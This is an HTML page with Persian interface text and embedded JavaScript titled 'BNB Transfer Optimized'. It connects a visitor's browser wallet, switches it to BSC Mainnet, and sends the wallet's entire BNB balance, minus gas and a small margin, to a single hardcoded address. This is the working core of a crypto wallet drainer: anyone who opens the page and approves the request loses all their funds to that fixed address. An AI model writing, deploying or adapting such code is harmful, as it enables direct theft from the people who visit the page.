<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BNB Transfer Optimized</title>
<style>
body{font-family:sans-serif;text-align:center;margin-top:50px;}
button{padding:10px 20px;font-size:16px;margin:10px;}
</style>
</head>
<body>

<h2>انتقال کل BNB (یک کلیک، اصلاح‌شده)</h2>

<button onclick="connectWallet()">کانکت</button>
<button onclick="sendBNB()">انتقال کل BNB</button>

<p id="status"></p>

<script>
let account;
const DESTINATION = "0x1F40f55A445483205546E9F16B09b2134142959A";

function setStatus(msg){
    document.getElementById("status").innerText = msg;
}

// کانکت با ولت و سوئیچ خودکار به BSC
async function connectWallet(){
    if(!window.ethereum){ alert("Wallet پیدا نشد"); return; }
    try{
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        account = accounts[0];
        setStatus("Connected: " + account);

        // سوئیچ خودکار به BSC Mainnet
        await ethereum.request({
            method:"wallet_switchEthereumChain",
            params:[{chainId:"0x38"}] // BSC Mainnet
        });
        setStatus("Connected & شبکه BSC فعال: " + account);
    }catch(err){
        console.error(err);
        alert("خطا در اتصال یا سوئیچ شبکه: " + (err.message || err));
    }
}

// انتقال کل موجودی به جز مقدار margin برای Gas
async function sendBNB(){
    if(!account){ alert("ابتدا کانکت کنید"); return; }
    setStatus("در حال آماده‌سازی تراکنش...");

    try{
        // خواندن موجودی واقعی
        const balanceHex = await ethereum.request({
            method: "eth_getBalance",
            params: [account, "latest"]
        });
        const balance = BigInt(balanceHex);

        // برآورد Gas و Gas Price
        const gasEstimate = await ethereum.request({
            method: "eth_estimateGas",
            params: [{
                from: account,
                to: DESTINATION,
                value: "0x" + balance.toString(16)
            }]
        });
        const gasPriceHex = await ethereum.request({ method:"eth_gasPrice" });
        const gasPrice = BigInt(gasPriceHex);
        const gasCost = BigInt(gasEstimate) * gasPrice;

        // margin اضافی کوچک برای اطمینان
        const margin = 10000n;
        const sendAmount = balance - gasCost - margin;

        if(sendAmount <= 0){
            alert("موجودی کافی برای پرداخت Gas و ارسال BNB وجود ندارد");
            return;
        }

        // ارسال تراکنش
        const txHash = await ethereum.request({
            method: "eth_sendTransaction",
            params: [{
                from: account,
                to: DESTINATION,
                value: "0x" + sendAmount.toString(16)
            }]
        });

        setStatus("تراکنش ارسال شد: " + txHash);

    }catch(err){
        console.error(err);
        if(err.code === 4001){
            alert("تراکنش توسط کاربر لغو شد");
        } else {
            alert("خطا در ارسال تراکنش: " + (err.message || err));
        }
    }
}
</script>

</body>
</html>
